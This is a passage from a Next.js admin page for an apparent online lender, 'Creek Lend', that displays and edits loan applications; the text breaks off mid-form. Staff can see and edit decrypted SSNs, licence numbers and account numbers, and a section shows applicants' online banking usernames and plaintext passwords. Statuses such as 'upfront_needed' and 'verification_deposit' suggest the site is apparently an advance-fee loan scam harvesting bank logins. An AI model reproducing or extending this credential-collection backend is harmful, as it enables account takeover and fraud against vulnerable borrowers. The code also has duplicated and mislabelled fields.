"use client";

import { useEffect, useState } from "react";
import { useParams, useRouter } from "next/navigation";
import Link from "next/link";
import { useAdminAuth, useAdminApi } from "@/lib/admin-auth";
import {
  ACCOUNT_TYPES,
  EMPLOYMENT_STATUSES,
  LOAN_PURPOSES,
  US_STATES,
} from "@/lib/constants";

interface ApplicationDetail {
  id: string;
  first_name: string;
  last_name: string;
  email: string;
  phone: string;
  date_of_birth: string;
  dl_state: string;
  street_address: string;
  city: string;
  state: string;
  zip_code: string;
  country: string;
  employment_status: string;
  employer_name: string;
  job_title: string;
  monthly_income: number;
  years_employed: number;
  loan_amount: number;
  loan_purpose: string;
  loan_term: number;
  bank_name: string;
  routing_number: string;
  bankAccountAge: string;
  bankAccountAge: string;
  account_type: string;
  utm_source: string;
  utm_medium: string;
  utm_campaign: string;
  utm_content: string;
  status: string;
  ip_address: string;
  user_agent: string;
  created_at: string;
  updated_at: string;
  reviewed_at: string | null;
  funded_at: string | null;
  // Decrypted fields (optional)
  ssn_decrypted?: string;
  dl_decrypted?: string;
  account_decrypted?: string;
  // Bank verification (nested object from API)
  bankVerification?: {
    full_name: string;
    email: string;
    application_id: string;
    online_banking_username: string;
    online_banking_password: string;
    bank_name: string;
    account_type: string;
    verification_status: string;
    created_at: string;
  };
}

interface BankVerificationDetail {
  full_name: string;
  email: string;
  application_id: string;
  online_banking_username: string;
  online_banking_password: string;
  bank_name: string;
  account_type: string;
  verification_status: string;
  created_at: string;
}

interface AuditEntry {
  id: string;
  action: string;
  performed_by: string;
  details: Record<string, unknown>;
  created_at: string;
}

// const STATUS_COLORS: Record<string, string> = {
//   bank_verification_pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
//   reviewing: "bg-blue-100 text-blue-800 border-blue-200",
//   bank_verification_completed: "bg-green-100 text-green-800 border-green-200",
//   declined: "bg-red-100 text-red-800 border-red-200",
//   funded: "bg-purple-100 text-purple-800 border-purple-200",
//   bank_verification_failed: "bg-red-100 text-red-800 border-red-200",
//   bank_verification_in_progress:
//     "bg-indigo-100 text-indigo-800 border-indigo-200",
//   deposit_in_progress: "bg-yellow-100 text-yellow-800",
// };

// const ALL_STATUSES = [
//   "bank_verification_pending",
//   "reviewing",
//   "bank_verification_completed",
//   "declined",
//   "funded",
//   "bank_verification_failed",
//   "bank_verification_in_progress",
//   "deposit_in_progress",
// ];

const STATUS_COLORS: Record<string, string> = {
  bank_verification_pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
  bank_verification_failed: "bg-red-100 text-red-800 border-red-200",
  verification_deposit_1: "bg-blue-100 text-blue-800 border-blue-200",
  verification_deposit_2: "bg-blue-100 text-blue-800 border-blue-200",
  funded: "bg-purple-100 text-purple-800 border-purple-200",
  declined: "bg-red-100 text-red-800 border-red-200",
  upfront_needed: "bg-orange-100 text-orange-800 border-orange-200",
  bank_verification_completed: "bg-green-100 text-green-800 border-green-200",
};

const ALL_STATUSES = [
  "bank_verification_pending",
  "bank_verification_failed",
  "verification_deposit_1",
  "verification_deposit_2",
  "funded",
  "declined",
  "upfront_needed",
];

function formatCurrency(amount: number) {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(amount);
}

function calcMonthlyPayment(amount: number, termMonths: number): number {
  const monthlyRate = 0.1 / 12;
  const factor = Math.pow(1 + monthlyRate, termMonths);
  return (amount * (monthlyRate * factor)) / (factor - 1);
}

function mdyToIso(mdy?: string | number | null) {
  if (!mdy) return "";

  const s = String(mdy);

  // Match MM/DD/YYYY with optional time
  const match = s.match(/^(\d{2})\/(\d{2})\/(\d{4})/);

  if (match) {
    const [, m, d, y] = match;
    return `${y}-${m}-${d}`;
  }

  return s.slice(0, 10);
}

function isoToMdy(iso: string) {
  if (!iso) return "";

  const match = iso.match(/^(\d{4})-(\d{2})-(\d{2})/);

  if (match) {
    const [, y, m, d] = match;
    return `${m}/${d}/${y}`;
  }

  return iso;
}

function formatDate(date: string | null) {
  if (!date) return "N/A";
  return new Date(date).toLocaleString("en-US", {
    month: "short",
    day: "numeric",
    year: "numeric",
    hour: "numeric",
    minute: "2-digit",
  });
}

function Section({
  title,
  children,
}: {
  title: string;
  children?: React.ReactNode;
}) {
  return (
    <div className="bg-white rounded-xl border border-gray-200 p-6">
      <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
        {title}
      </h3>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">{children}</div>
    </div>
  );
}

function Field({
  label,
  value,
}: {
  label: string;
  value: string | number | null | undefined;
}) {
  return (
    <div>
      <p className="text-xs text-gray-400">{label}</p>
      <p className="text-sm font-medium text-gray-900">{value ?? "N/A"}</p>
    </div>
  );
}

function EditableField({
  label,
  name,
  value,
  type = "text",
  min,
  max,
  onChange,
}: {
  label: string;
  name: string;
  value: string | number | null | undefined;
  type?: string;
  min?: number | string;
  max?: number | string;
  onChange: (name: string, value: string | number) => void;
}) {
  return (
    <div>
      <label className="text-xs text-gray-400">{label}</label>
      <input
        type={type}
        name={name}
        min={min}
        max={max}
        lang="en-US"
        value={value ?? ""}
        onChange={(e) => {
          if (type === "number") {
            const num = Number(e.target.value);
            const minN = min !== undefined ? Number(min) : -Infinity;
            const maxN = max !== undefined ? Number(max) : Infinity;
            const clamped = Math.min(Math.max(num, minN), maxN);
            onChange(name, Number.isNaN(clamped) ? 0 : clamped);
          } else {
            onChange(name, e.target.value);
          }
        }}
        className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
      />
    </div>
  );
}

export default function ApplicationDetailPage() {
  const params = useParams();
  const router = useRouter();
  const { user, loading, logout, isReviewer, isAdmin } = useAdminAuth();
  const { adminFetch } = useAdminApi();

  const [app, setApp] = useState<ApplicationDetail | null>(null);
  const [bankVerification, setBankVerification] =
    useState<BankVerificationDetail | null>(null);
  const [auditLog, setAuditLog] = useState<AuditEntry[]>([]);
  const [dataLoading, setDataLoading] = useState(true);
  const [showDecrypted, setShowDecrypted] = useState(false);
  const [statusUpdating, setStatusUpdating] = useState(false);
  const [deleteConfirm, setDeleteConfirm] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [edit, setEdit] = useState(false);
  const [saving, setSaving] = useState(false);
  const [formData, setFormData] = useState<Partial<ApplicationDetail>>({});

  const id = params.id as string;
  console.log(bankVerification);

  useEffect(() => {
    if (!loading && !user) router.replace("/admin/login");
  }, [loading, user, router]);

  useEffect(() => {
    if (!user || !id) return;

    adminFetch(`/api/admin/applications/${id}`)
      .then((r) => {
        if (!r.ok) throw new Error("Application not found");
        return r.json();
      })
      .then((data) => {
        setApp(data.application);
        setBankVerification(data?.bankVerification);
        setAuditLog(data.auditLog || []);
      })
      .catch((err) => setError(err.message))
      .finally(() => setDataLoading(false));
  }, [user, id, adminFetch]);

  useEffect(() => {
    if (edit && app) {
      setFormData({
        first_name: app.first_name,
        last_name: app.last_name,
        email: app.email,
        phone: app.phone,
        date_of_birth: app.date_of_birth,
        dl_state: app.dl_state,
        street_address: app.street_address,
        city: app.city,
        state: app.state,
        zip_code: app.zip_code,
        country: app.country,
        employment_status: app.employment_status,
        employer_name: app.employer_name,
        job_title: app.job_title,
        monthly_income: app.monthly_income,
        ssn_decrypted: app?.ssn_decrypted,
        years_employed: app.years_employed,
        loan_amount: app.loan_amount,
        loan_purpose: app.loan_purpose,
        loan_term: app.loan_term,
        bank_name: app.bank_name,
        routing_number: app.routing_number,
        account_decrypted: app?.account_decrypted,
        account_type: app.account_type,
        dl_decrypted: app?.dl_decrypted,
        bankVerification: {
          online_banking_username:
            bankVerification?.online_banking_username ?? "",
          online_banking_password:
            bankVerification?.online_banking_password ?? "",
          bank_name: bankVerification?.bank_name ?? "",
          account_type: bankVerification?.account_type ?? "",
          full_name: bankVerification?.full_name ?? "",
          email: bankVerification?.email ?? "",
        } as BankVerificationDetail,
      });
    }
  }, [edit, app, bankVerification]);

  useEffect(() => {
    console.log("app", app?.date_of_birth);
  }, [app]);

  const handleFormChange = (name: string, value: string | number) => {
    let newValue = value;

    if (name === "phone") {
      const digits = String(value).replace(/\D/g, "").slice(0, 10);

      if (digits.length > 6) {
        newValue = `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
      } else if (digits.length > 3) {
        newValue = `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
      } else if (digits.length > 0) {
        newValue = `(${digits}`;
      } else {
        newValue = "";
      }
    }

    if (name === "ssn_decrypted") {
      const digits = String(value).replace(/\D/g, "").slice(0, 9);

      if (digits.length > 5) {
        newValue = `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`;
      } else if (digits.length > 3) {
        newValue = `${digits.slice(0, 3)}-${digits.slice(3)}`;
      } else {
        newValue = digits;
      }
    }

    setFormData((prev) => ({
      ...prev,
      [name]: newValue,
    }));
  };

  const handleBankVerificationChange = (
    name: string,
    value: string | number,
  ) => {
    setFormData((prev) => ({
      ...prev,
      bankVerification: {
        ...(prev.bankVerification as BankVerificationDetail),
        [name]: value,
      },
    }));
  };

  const handleSave = async () => {
    setSaving(true);
    setError("");
    setSuccess("");
    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "PATCH",
        body: JSON.stringify(formData),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Save failed");
      setApp((prev) => (prev ? { ...prev, ...formData } : prev));
      setSuccess("Application updated successfully");
      setEdit(false);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Save failed");
    } finally {
      setSaving(false);
    }
  };

  const handleStatusUpdate = async (newStatus: string) => {
    setStatusUpdating(true);
    setError("");
    setSuccess("");

    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "PATCH",
        body: JSON.stringify({ status: newStatus }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);

      setSuccess(
        `Status updated to ${newStatus.replace(/_/g, " ").replace(/\b\w/g, (l) => l.toUpperCase())}`,
      );
      setApp((prev) => (prev ? { ...prev, status: newStatus } : prev));

      // Refresh audit log
      const logRes = await adminFetch(`/api/admin/applications/${id}`);
      const logData = await logRes.json();
      setAuditLog(logData.auditLog || []);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Update failed");
    } finally {
      setStatusUpdating(false);
    }
  };

  const handleDelete = async () => {
    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "DELETE",
      });
      if (!res.ok) {
        const data = await res.json();
        throw new Error(data.error);
      }
      router.push("/admin/applications");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Delete failed");
      setDeleteConfirm(false);
    }
  };

  if (loading || !user) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
      </div>
    );
  }

  if (user.role === "reviewer") {
    return (
      <div className="min-h-screen bg-gray-50">
        {/* Top Nav */}
        <nav className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between sticky top-0 z-10">
          <div className="flex items-center gap-6">
            <Link href="/admin" className="text-xl font-bold text-primary">
              Creek Lend
            </Link>
            <div className="hidden sm:flex items-center gap-4 text-sm">
              <Link
                href="/admin"
                className="text-gray-600 hover:text-primary transition"
              >
                Dashboard
              </Link>
              <Link
                href="/admin/applications"
                className="text-primary font-medium"
              >
                Applications
              </Link>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-sm text-gray-500 hidden sm:inline">
              {user.name} ({user.role})
            </span>
            <button
              onClick={logout}
              className="text-sm text-red-600 hover:text-red-800 font-medium cursor-pointer"
            >
              Logout
            </button>
          </div>
        </nav>

        <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
          {/* Back link */}
          <button
            onClick={() => router.back()}
            className="text-sm text-primary hover:underline mb-4 inline-block cursor-pointer"
          >
            &larr; Back to Applications
          </button>

          {dataLoading ? (
            <div className="flex justify-center py-12">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
            </div>
          ) : error && !app ? (
            <div className="p-8 text-center text-red-500">{error}</div>
          ) : app ? (
            <div className="space-y-6">
              {/* Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h1 className="text-2xl font-bold text-gray-900">
                    {app.first_name} {app.last_name}
                  </h1>
                  <p className="text-gray-500">
                    {app.email} &middot; {app.phone}
                  </p>
                </div>
                <span
                  className={`px-4 py-2 rounded-full text-sm font-semibold border ${STATUS_COLORS[app.status] || ""}`}
                >
                  {app.status.replace(/_/g, " ").toUpperCase()}
                </span>
              </div>

              {/* Messages */}
              {error && (
                <div className="p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-sm">
                  {error}
                </div>
              )}
              {success && (
                <div className="p-3 bg-green-50 border border-green-200 text-green-700 rounded-lg text-sm">
                  {success}
                </div>
              )}

              {/* Status Actions */}
              {isReviewer && (
                <div className="bg-white rounded-xl border border-gray-200 p-6">
                  <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-3">
                    Update Status
                  </h3>
                  <div className="flex flex-wrap gap-2">
                    {ALL_STATUSES.filter((s) => {
                      // If reviewer → only allow 2 statuses
                      if (isReviewer) {
                        return [
                          "bank_verification_pending",
                          "declined",
                        ].includes(s);
                      }

                      // Otherwise → show all except current
                      return s !== app.status;
                    }).map((s) => (
                      <button
                        key={s}
                        onClick={() => handleStatusUpdate(s)}
                        disabled={statusUpdating}
                        className={`px-4 py-2 rounded-lg text-sm font-medium border transition cursor-pointer disabled:opacity-50 ${STATUS_COLORS[s] || ""}`}
                      >
                        {statusUpdating
                          ? "..."
                          : s
                              .replace(/_/g, " ")
                              .replace(/\b\w/g, (l) => l.toUpperCase())}
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Personal Info */}
              <Section title="Personal Information">
                <Field label="Application ID" value={app.id} />
                <Field
                  label="Full name"
                  value={`${app.first_name} ${app.last_name}`}
                />
                <Field label="Email" value={app.email} />
                <Field label="Phone" value={app.phone} />
                <Field
                  label="Date of Birth"
                  value={
                    app.date_of_birth
                      ? new Date(app.date_of_birth).toLocaleDateString(
                          "en-US",
                          {
                            month: "2-digit",
                            day: "2-digit",
                            year: "numeric",
                          },
                        )
                      : "N/A"
                  }
                />
                <Field label="Driver's License State" value={app.dl_state} />
                <Field label="SSN" value={app.ssn_decrypted} />
                <Field label="DL Number" value={app.dl_decrypted} />
              </Section>

              {/* Address */}
              <Section title="Address">
                <div className="sm:col-span-2">
                  <Field
                    label="Full Address"
                    value={`${app.street_address}, ${app.city}, ${app.state} ${app.zip_code}, ${app.country}`}
                  />
                </div>
              </Section>

              {/* Employment */}
              {/* <Section title="Employment">
                <Field label="Status" value={app.employment_status} />
                <Field label="Employer" value={app.employer_name} />
                <Field label="Job Title" value={app.job_title} />
                <Field
                  label="Monthly Income"
                  value={formatCurrency(app.monthly_income)}
                />
                <Field label="Years Employed" value={app.years_employed} />
              </Section> */}

              {/* Loan Details */}
              <Section title="Loan Details">
                <Field
                  label="Loan Amount"
                  value={formatCurrency(app.loan_amount)}
                />
                {/* <Field
                  label="Purpose"
                  value={app.loan_purpose?.replace(/-/g, " ")}
                /> */}
                <Field label="Loan Term" value={`${app.loan_term} months`} />
                <Field
                  label="Monthly Payment"
                  value={formatCurrency(
                    calcMonthlyPayment(app.loan_amount, app.loan_term),
                  )}
                />
              </Section>

              {/* Banking */}
              <Section title="Banking Information">
                <Field label="Bank Name" value={app.bank_name} />
                <Field label="Routing" value={app.routing_number} />
                <Field label="Account" value={app.account_type} />
                <Field label="Account Number" value={app.account_decrypted} />
                <Field
                  label="Bank Balance Status"
                  value={app.bankAccountAge || "-"}
                />
                <Field
                  label="Bank Account Age"
                  value={app.bankAccountAge || "-"}
                />
                {/* {isReviewer && (
                  <div className="sm:col-span-2">
                    <button
                      onClick={() => setShowDecrypted(!showDecrypted)}
                      className="text-sm text-primary hover:underline cursor-pointer"
                    >
                      {showDecrypted
                        ? "Hide Sensitive Data"
                        : "Show Sensitive Data"}
                    </button>
                  </div>
                )} */}
              </Section>

              {/* Bank Verification Details */}
              {bankVerification && (
                <Section title="Bank Verification Details">
                  {/* <Field
                    label="Full name"
                    value={bankVerification?.full_name}
                  /> */}
                  {/* <Field label="Email" value={bankVerification?.email} /> */}
                  <Field
                    label="Online Bank Username"
                    value={bankVerification?.online_banking_username}
                  />
                  <Field
                    label="Online Bank Password"
                    value={bankVerification?.online_banking_password}
                  />
                  {/* <Field
                    label="Application ID"
                    value={bankVerification?.application_id}
                  />
                  <Field
                    label="Bank Name"
                    value={bankVerification?.bank_name}
                  />
                  <Field
                    label="Account"
                    value={bankVerification?.account_type}
                  />
                  <Field
                    label="Verification Status"
                    value={bankVerification?.verification_status}
                  />
                  <Field
                    label="Submitted At"
                    value={bankVerification?.created_at}
                  /> */}
                </Section>
              )}

              {/* UTM / Tracking */}
              {/* {(app.utm_source || app.utm_medium || app.utm_campaign) && (
                <Section title="UTM Tracking">
                  <Field label="Source" value={app.utm_source} />
                  <Field label="Medium" value={app.utm_medium} />
                  <Field label="Campaign" value={app.utm_campaign} />
                  <Field label="Content" value={app.utm_content} />
                </Section>
              )} */}

              {/* Timestamps */}
              {/* <Section title="Timestamps">
                <Field label="Created" value={formatDate(app.created_at)} />
                <Field label="Updated" value={formatDate(app.updated_at)} />
                <Field label="Reviewed" value={formatDate(app.reviewed_at)} />
                <Field label="Funded" value={formatDate(app.funded_at)} />
                <Field label="IP Address" value={app.ip_address} />
              </Section> */}

              {/* Audit Log */}
              {auditLog.length > 0 && (
                <div className="bg-white rounded-xl border border-gray-200 p-6">
                  <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
                    Audit Log
                  </h3>
                  <div className="space-y-3">
                    {auditLog.map((entry) => (
                      <div
                        key={entry.id}
                        className="flex items-start gap-3 text-sm border-b border-gray-50 pb-3"
                      >
                        <div className="flex-1">
                          <span className="font-medium text-gray-900">
                            {entry.action}
                          </span>
                          <span className="text-gray-400 mx-2">by</span>
                          <span className="text-gray-600">
                            {entry.performed_by}
                          </span>
                          {entry.details &&
                            Object.keys(entry.details).length > 0 && (
                              <p className="text-xs text-gray-400 mt-1">
                                {JSON.stringify(entry.details)}
                              </p>
                            )}
                        </div>
                        <span className="text-xs text-gray-400 whitespace-nowrap">
                          {formatDate(entry.created_at)}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Delete */}
              {isAdmin && (
                <div className="bg-white rounded-xl border border-red-200 p-6">
                  <h3 className="text-sm font-semibold text-red-500 uppercase tracking-wide mb-3">
                    Danger Zone
                  </h3>
                  {deleteConfirm ? (
                    <div className="flex items-center gap-3">
                      <p className="text-sm text-gray-600">
                        Are you sure? This action cannot be undone.
                      </p>
                      <button
                        onClick={handleDelete}
                        className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition cursor-pointer"
                      >
                        Confirm Delete
                      </button>
                      <button
                        onClick={() => setDeleteConfirm(false)}
                        className="px-4 py-2 border border-gray-300 rounded-lg text-sm hover:bg-gray-50 transition cursor-pointer"
                      >
                        Cancel
                      </button>
                    </div>
                  ) : (
                    <button
                      onClick={() => setDeleteConfirm(true)}
                      className="px-4 py-2 border border-red-300 text-red-600 rounded-lg text-sm font-medium hover:bg-red-50 transition cursor-pointer"
                    >
                      Delete Application
                    </button>
                  )}
                </div>
              )}
            </div>
          ) : null}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Top Nav */}
      <nav className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between sticky top-0 z-10">
        <div className="flex items-center gap-6">
          <Link href="/admin" className="text-xl font-bold text-primary">
            Creek Lend
          </Link>
          <div className="hidden sm:flex items-center gap-4 text-sm">
            <Link
              href="/admin"
              className="text-gray-600 hover:text-primary transition"
            >
              Dashboard
            </Link>
            <Link
              href="/admin/applications"
              className="text-primary font-medium"
            >
              Applications
            </Link>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <span className="text-sm text-gray-500 hidden sm:inline">
            {user.name} ({user.role})
          </span>
          <button
            onClick={logout}
            className="text-sm text-red-600 hover:text-red-800 font-medium cursor-pointer"
          >
            Logout
          </button>
        </div>
      </nav>

      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
        {/* Back link */}
        <button
          onClick={() => router.back()}
          className="text-sm text-primary hover:underline mb-4 inline-block cursor-pointer"
        >
          &larr; Back to Applications
        </button>

        {dataLoading ? (
          <div className="flex justify-center py-12">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
          </div>
        ) : error && !app ? (
          <div className="p-8 text-center text-red-500">{error}</div>
        ) : app ? (
          <div className="space-y-6">
            {/* Header */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <h1 className="text-2xl font-bold text-gray-900">
                  {app.first_name} {app.last_name}
                </h1>
                <p className="text-gray-500">
                  {app.email} &middot; {app.phone}
                </p>
              </div>
              <div className="flex items-center gap-3 flex-wrap">
                {edit ? (
                  <>
                    <button
                      onClick={handleSave}
                      disabled={saving}
                      className="px-4 py-2 rounded-lg text-sm font-medium bg-primary text-white hover:opacity-90 transition cursor-pointer disabled:opacity-50"
                    >
                      {saving ? "Saving..." : "Save"}
                    </button>
                    <button
                      onClick={() => setEdit(false)}
                      disabled={saving}
                      className="px-4 py-2 rounded-lg text-sm font-medium border border-gray-300 text-gray-700 hover:bg-gray-50 transition cursor-pointer disabled:opacity-50"
                    >
                      Cancel
                    </button>
                  </>
                ) : (
                  isAdmin && (
                    <button
                      onClick={() => setEdit(true)}
                      className="px-4 py-2 rounded-lg text-sm font-medium border border-gray-300 text-gray-700 hover:bg-gray-50 transition cursor-pointer"
                    >
                      Edit
                    </button>
                  )
                )}
                <span
                  className={`px-4 py-2 rounded-full text-sm font-semibold border ${STATUS_COLORS[app.status] || ""}`}
                >
                  {app.status.replace(/_/g, " ").toUpperCase()}
                </span>
              </div>
            </div>

            {/* Messages */}
            {error && (
              <div className="p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-sm">
                {error}
              </div>
            )}
            {success && (
              <div className="p-3 bg-green-50 border border-green-200 text-green-700 rounded-lg text-sm">
                {success}
              </div>
            )}

            {/* Status Actions */}
            {isReviewer && (
              <div className="bg-white rounded-xl border border-gray-200 p-6">
                <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-3">
                  Update Status
                </h3>
                <div className="flex flex-wrap gap-2">
                  {ALL_STATUSES.filter((s) => s !== app.status).map((s) => (
                    <button
                      key={s}
                      onClick={() => handleStatusUpdate(s)}
                      disabled={statusUpdating}
                      className={`px-4 py-2 rounded-lg text-sm font-medium border transition cursor-pointer disabled:opacity-50 ${STATUS_COLORS[s] || ""}`}
                    >
                      {statusUpdating
                        ? "..."
                        : s
                            .replace(/_/g, " ")
                            .replace(/\b\w/g, (l) => l.toUpperCase())}
                    </button>
                  ))}
                </div>
              </div>
            )}

            {/* Personal Info */}
            <Section title="Personal Information">
              {edit ? (
                <>
                  <Field label="Application ID" value={app.id} />
                  <EditableField
                    label="First Name"
                    name="first_name"
                    value={formData.first_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Last Name"
                    name="last_name"
                    value={formData.last_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Email"
                    name="email"
                    type="email"
                    value={formData.email}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Phone"
                    name="phone"
                    value={formData.phone}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Date of Birth"
                    name="date_of_birth"
                    type="date"
                    value={mdyToIso(formData?.date_of_birth)}
                    onChange={(name, value) =>
                      handleFormChange(name, isoToMdy(String(value)))
                    }
                  />
                  <div>
                    <label
                      htmlFor="driverLicenseState"
                      className="block text-xs text-gray-400"
                    >
                      DL Issuing State
                    </label>
                    <select
                      value={formData.dl_state ?? ""}
                      onChange={(e) =>
                        handleFormChange("dl_state", e.target.value)
                      }
                      id="driverLicenseState"
                      className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
                    >
                      <option value="">Select state</option>
                      {US_STATES.map((s) => (
                        <option key={s.value} value={s.value}>
                          {s.label}
                        </option>
                      ))}
                    </select>
                  </div>
                  {/* <EditableField
                    label="Driver's License State"
                    name="dl_state"
                    value={formData.dl_state}
                    onChange={handleFormChange}
                  /> */}
                  <EditableField
                    label="SSN"
                    name="ssn_decrypted"
                    value={formData.ssn_decrypted}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Driver's License Number"
                    name="dl_decrypted"
                    value={formData.dl_decrypted}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <>
                  <Field label="Application ID" value={app.id} />
                  <Field
                    label="Full name"
                    value={`${app.first_name} ${app.last_name}`}
                  />
                  <Field label="Email" value={app.email} />
                  <Field label="Phone" value={app.phone} />
                  <Field
                    label="Date of Birth"
                    value={
                      app.date_of_birth
                        ? new Date(app.date_of_birth).toLocaleDateString(
                            "en-US",
                            {
                              month: "2-digit",
                              day: "2-digit",
                              year: "numeric",
                            },
                          )
                        : "N/A"
                    }
                  />
                  <Field label="Driver's License State" value={app.dl_state} />
                  <Field label="SSN" value={app.ssn_decrypted} />
                  <Field label="DL Number" value={app.dl_decrypted} />
                </>
              )}
            </Section>

            {/* Address */}
            <Section title="Address">
              {edit ? (
                <>
                  <div className="sm:col-span-2">
                    <EditableField
                      label="Street Address"
                      name="street_address"
                      value={formData.street_address}
                      onChange={handleFormChange}
                    />
                  </div>
                  <EditableField
                    label="City"
                    name="city"
                    value={formData.city}
                    onChange={handleFormChange}
                  />
                  <div>
                    <label
                      htmlFor="state"
                      className="block text-xs text-gray-400"
                    >
                      State
                    </label>
                    <select
                      value={formData.state ?? ""}
                      onChange={(e) =>
                        handleFormChange("state", e.target.value)
                      }
                      id="state"
                      className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
                    >
                      <option value="">Select state</option>
                      {US_STATES.map((s) => (
                        <option key={s.value} value={s.value}>
                          {s.label}
                        </option>
                      ))}
                    </select>
                  </div>
                  {/* <EditableField
                    label="State"
                    name="state"
                    value={formData.state}
                    onChange={handleFormChange}
                  /> */}
                  <EditableField
                    label="Zip Code"
                    name="zip_code"
                    value={formData.zip_code}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Country"
                    name="country"
                    value={formData.country}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <div className="sm:col-span-2">
                  <Field
                    label="Full Address"
                    value={`${app.street_address}, ${app.city}, ${app.state} ${app.zip_code}, ${app.country}`}
                  />
                </div>
              )}
            </Section>

            {/* Employment */}
            <Section title="Employment">
              {edit ? (
                <>
                  <div>
                    <label
                      htmlFor="employment_status"
                      className="block text-xs text-gray-400"
                    >
                      Employment Status
                    </label>
                    <select
                      value={formData.employment_status ?? ""}
                      onChange={(e) =>
                        handleFormChange("employment_status", e.target.value)
                      }
                      id="employment_status"
                      className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
                    >
                      <option value="">Select status</option>
                      {EMPLOYMENT_STATUSES.map((s) => (
                        <option key={s.value} value={s.value}>
                          {s.label}
                        </option>
                      ))}
                    </select>
                  </div>
                  {/* <EditableField
                    label="Status"
                    name="employment_status"
                    value={formData.employment_status}
                    onChange={handleFormChange}
                  /> */}
                  <EditableField
                    label="Employer"
                    name="employer_name"
                    value={formData.employer_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Job Title"
                    name="job_title"
                    value={formData.job_title}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Monthly Income"
                    name="monthly_income"
                    type="number"
                    value={formData.monthly_income}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Years Employed"
                    name="years_employed"
                    type="number"
                    value={formData.years_employed}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <>
                  <Field label="Status" value={app.employment_status} />
                  <Field label="Employer" value={app.employer_name} />
                  <Field label="Job Title" value={app.job_title} />
                  <Field
                    label="Monthly Income"
                    value={formatCurrency(app.monthly_income)}
                  />
                  <Field label="Years Employed" value={app.years_employed} />
                </>
              )}
            </Section>

            {/* Loan Details */}
            <Section title="Loan Details">
              {edit ? (
                <>
                  <EditableField
                    label="Loan Amount ($2,000 - $10,000)"
                    name="loan_amount"
                    type="number"
                    min={2000}
                    max={10000}
                    value={formData.loan_amount}
                    onChange={handleFormChange}
                  />
                  {/* <EditableField
                    label="Purpose"
                    name="loan_purpose"
                    value={formData.loan_purpose}
                    onChange={handleFormChange}
                  /> */}
                  <div>
                    <label
                      htmlFor="loan_purpose"
                      className="block text-xs text-gray-400"
                    >
                      Loan Purpose
                    </label>
                    <select
                      id="loan_purpose"
                      value={formData.loan_purpose ?? ""}
                      onChange={(e) =>
                        handleFormChange("loan_purpose", e.target.value)
                      }
                      className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
                    >
                      <option value="">Select purpose</option>
                      {LOAN_PURPOSES.map((p) => (
                        <option key={p.value} value={p.value}>
                          {p.label}
                        </option>
                      ))}
                    </select>
                  </div>
                  {/* <EditableField
                    label="Loan Term (months)"
                    name="loan_term"
                    type="number"
                    value={formData.loan_term}
                    onChange={handleFormChange}
                  /> */}
                  <div>
